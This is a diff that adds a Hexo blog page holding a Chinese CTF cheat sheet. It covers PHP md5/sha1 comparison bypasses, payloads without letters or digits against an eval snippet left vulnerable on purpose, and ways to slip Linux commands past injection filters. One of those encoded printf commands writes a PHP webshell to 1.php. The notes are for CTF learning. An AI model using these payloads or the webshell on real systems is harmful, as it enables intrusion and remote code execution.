@@ -1,0 +1,383 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  
+    <title>ctf | buxqm</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Ycj">
+    
+    <meta name="description" content="CTFmd5常见绕过强比较绕过数组绕过
+​    md5碰到数组数据时返回null，null===nulll绕过。
+md5碰撞
+​    fastcoll
+弱比较绕过利用科学计数法0e+任何数字都为0。
+以下值在md5加密后以0E开头：
+123456QNKCDZO240610708s87892619">
+    
+    
+    
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/author.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/author.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      <div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.svg" alt="buxqm" title="buxqm"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="buxqm">buxqm</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+					<li>
+					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:yoursite.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2019/09/10/ctf总结/" title="ctf" itemprop="url">ctf</a>
+  </h1>
+  <p class="article-author">By
+    
+      <a href="http://yoursite.com" title="Ycj">Ycj</a>
+    </p>
+  <p class="article-time">
+    <time datetime="2019-09-09T16:00:00.000Z" itemprop="datePublished">2019-09-10</time>
+    Updated:<time datetime="2020-09-28T08:42:07.563Z" itemprop="dateModified">2020-09-28</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF"><span class="toc-number">1.</span> <span class="toc-text">CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#md5常见绕过"><span class="toc-number">1.1.</span> <span class="toc-text">md5常见绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#强比较绕过"><span class="toc-number">1.1.1.</span> <span class="toc-text">强比较绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#弱比较绕过"><span class="toc-number">1.1.2.</span> <span class="toc-text">弱比较绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eval命令执行"><span class="toc-number">1.2.</span> <span class="toc-text">eval命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#无数字字母"><span class="toc-number">1.2.1.</span> <span class="toc-text">无数字字母</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux命令执行"><span class="toc-number">1.3.</span> <span class="toc-text">Linux命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#常用通配符"><span class="toc-number">1.3.1.</span> <span class="toc-text">常用通配符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#空格绕过"><span class="toc-number">1.3.2.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#黑名单绕过"><span class="toc-number">1.3.3.</span> <span class="toc-text">黑名单绕过</span></a></li></ol></li></ol></li></ol>
+		</div>
+		
+		<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="md5常见绕过"><a href="#md5常见绕过" class="headerlink" title="md5常见绕过"></a>md5常见绕过</h2><h3 id="强比较绕过"><a href="#强比较绕过" class="headerlink" title="强比较绕过"></a>强比较绕过</h3><p>数组绕过</p>
+<p>​    md5碰到数组数据时返回null，null===nulll绕过。</p>
+<p>md5碰撞</p>
+<p>​    fastcoll</p>
+<h3 id="弱比较绕过"><a href="#弱比较绕过" class="headerlink" title="弱比较绕过"></a>弱比较绕过</h3><p>利用科学计数法0e+任何数字都为0。</p>
+<p>以下值在md5加密后以0E开头：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
+
+<p>以下值在sha1加密后以0E开头：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sha1(‘aaroZmOk’)</span><br><span class="line">sha1(‘aaK1STfY’)</span><br><span class="line">sha1(‘aaO8zKZF’)</span><br><span class="line">sha1(‘aa3OFF9m’)</span><br></pre></td></tr></table></figure>
+
+<p>以下值加密前后弱比较相等</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e215962017</span><br></pre></td></tr></table></figure>
+
+<h2 id="eval命令执行"><a href="#eval命令执行" class="headerlink" title="eval命令执行"></a>eval命令执行</h2><h3 id="无数字字母"><a href="#无数字字母" class="headerlink" title="无数字字母"></a>无数字字母</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9]/is'</span>,$_GET[<span class="string">'shell'</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">'shell'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload php5-php7.0</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell=$_=<span class="string">"`&#123;&#123;&#123;"</span>^<span class="string">"?&lt;&gt;/"</span>;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=phpinfo()<span class="comment">//$_=_GET</span></span><br></pre></td></tr></table></figure>
+
+<p>如果把下划线也ban了，还能使用不可见字符或者+或者中文来做变量名。</p>
+<p>php7.0之后BAN了assert，不过可以用取反来调用函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell=(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();<span class="comment">//phpinfo();</span></span><br></pre></td></tr></table></figure>
+
+<p>值得一提的是eval 属于PHP语法构造的一部分，并不是一个函数，所以不能通过变量函数的形式来调用（虽然它确实像极了函数原型）。这样的语法构造还包括：echo，print，unset()，isset()，empty()，include，require。</p>
+<h2 id="Linux命令执行"><a href="#Linux命令执行" class="headerlink" title="Linux命令执行"></a>Linux命令执行</h2><p>参考文章<a href="https://blog.zeddyu.info/2019/01/17/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/01/17/</a> </p>
+<h3 id="常用通配符"><a href="#常用通配符" class="headerlink" title="常用通配符"></a>常用通配符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?匹配一个任意字符</span><br><span class="line">*匹配任意字符</span><br></pre></td></tr></table></figure>
+
+<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>$IFS分隔符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;IFS&#125;</span>,<span class="variable">$IFS</span><span class="variable">$9</span></span><br></pre></td></tr></table></figure>
+
+<p>IFS表示linux下的分隔符，但是直接使用$IFS会导致歧义，比如cat$IFSfile，这样bash会将整个IFSfile当成变量名，导致无法读取到file文件，通常我们用${IFS}来确定变量名，或者使用$IFS$9,$9为当前系统shell进程的第九个参数，默认为空，在这里起到一个隔断作用。</p>
+<p>花括号扩展<code>{OS_COMMAND,ARGUMENT}</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,file&#125;</span><br></pre></td></tr></table></figure>
+
+<p>变量绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="string">'cat\x20flag'</span>&amp;&amp;<span class="variable">$x</span></span><br><span class="line">x=<span class="string">'cat\x09flag'</span>&amp;&amp;<span class="variable">$x</span></span><br></pre></td></tr></table></figure>
+
+<p>\x20和\x09分别表示空格与tab。</p>
+<h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">变量拼接</span><br><span class="line">a=l;b=s;<span class="variable">$a</span><span class="variable">$b</span></span><br><span class="line"><span class="variable">$@</span>绕过</span><br><span class="line">l<span class="variable">$@s</span></span><br><span class="line">单双引号绕过</span><br><span class="line"><span class="string">"l"</span>s</span><br><span class="line">反斜杠绕过</span><br><span class="line">l\s</span><br><span class="line">已有资源截取</span><br><span class="line">ls <span class="variable">$&#123;PATH:9:1&#125;</span><span class="variable">$&#123;PATH:11:1&#125;</span></span><br><span class="line">nl <span class="variable">$&#123;PATH:14:1&#125;</span><span class="variable">$&#123;PATH:21:1&#125;</span></span><br><span class="line"><span class="variable">$PS2</span>= &gt;</span><br><span class="line"><span class="variable">$ps4</span>= +</span><br><span class="line">编码绕过</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"命令base64编码"</span>|base64 -d|bash</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"hex编码"</span> | xxd -r -p|bash</span><br><span class="line">$(<span class="built_in">printf</span> <span class="string">"\154\163"</span>)八进制编码</span><br><span class="line">&#123;<span class="built_in">printf</span>,<span class="string">"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"</span>&#125; &gt;&gt; 1.php</span><br><span class="line">写shell</span><br></pre></td></tr></table></figure>
+
+  
+	</div>
+		<footer class="article-footer clearfix">
+
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/trick/">trick</a>
+</div>
+
+
+
+<div class="article-share" id="share">
+
+  <div data-url="http://yoursite.com/2019/09/10/ctf总结/" data-title="ctf | buxqm" data-tsina="" class="share clearfix">
+  </div>
+
+</div>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2019/09/10/BUUCTF/" title="BUUCTF">
+  <strong>PREVIOUS:</strong><br/>
+  <span>
+  BUUCTF</span>
+</a>
+</div>
+
+
+</nav>
+
+	
+<section class="comment">
+	<div class="ds-thread"></div>
+</section>
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF"><span class="toc-number">1.</span> <span class="toc-text">CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#md5常见绕过"><span class="toc-number">1.1.</span> <span class="toc-text">md5常见绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#强比较绕过"><span class="toc-number">1.1.1.</span> <span class="toc-text">强比较绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#弱比较绕过"><span class="toc-number">1.1.2.</span> <span class="toc-text">弱比较绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eval命令执行"><span class="toc-number">1.2.</span> <span class="toc-text">eval命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#无数字字母"><span class="toc-number">1.2.1.</span> <span class="toc-text">无数字字母</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux命令执行"><span class="toc-number">1.3.</span> <span class="toc-text">Linux命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#常用通配符"><span class="toc-number">1.3.1.</span> <span class="toc-text">常用通配符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#空格绕过"><span class="toc-number">1.3.2.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#黑名单绕过"><span class="toc-number">1.3.3.</span> <span class="toc-text">黑名单绕过</span></a></li></ol></li></ol></li></ol>
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+			<li><a href="/categories/WebBook/" title="WebBook">WebBook<sup>0</sup></a></li>
+		
+			<li><a href="/categories/XXE/" title="XXE">XXE<sup>1</sup></a></li>
+		
+			<li><a href="/categories/docker/" title="docker">docker<sup>0</sup></a></li>
+		
+			<li><a href="/categories/python/" title="python">python<sup>0</sup></a></li>
+		
+			<li><a href="/categories/sql注入/" title="sql注入">sql注入<sup>0</sup></a></li>
+		
+			<li><a href="/categories/trick/" title="trick">trick<sup>1</sup></a></li>
+		
+			<li><a href="/categories/writeup/" title="writeup">writeup<sup>1</sup></a></li>
+		
+			<li><a href="/categories/xss学习/" title="xss学习">xss学习<sup>0</sup></a></li>
+		
+			<li><a href="/categories/专题-JavaWeb/" title="专题  JavaWeb">专题  JavaWeb<sup>0</sup></a></li>
+		
+			<li><a href="/categories/专题-Python/" title="专题  Python">专题  Python<sup>0</sup></a></li>
+		
+			<li><a href="/categories/专题-XXE/" title="专题  XXE">专题  XXE<sup>0</sup></a></li>
+		
+			<li><a href="/categories/专题-writeup/" title="专题  writeup">专题  writeup<sup>1</sup></a></li>
+		
+			<li><a href="/categories/专题-可视神经网络/" title="专题  可视神经网络">专题  可视神经网络<sup>0</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  
+
+  <div class="rsspart">
+	<a href="" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Hello <br/>
+			似水流年</p>
+	</section>
+	 
+	<div class="social-font clearfix">
+		
+		
+		
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="Pacman">Pacman</a> © 2020 
+		
+		<a href="http://yoursite.com" target="_blank" title="Ycj">Ycj</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});     
+</script>
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:""};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+  </body>
+</html>
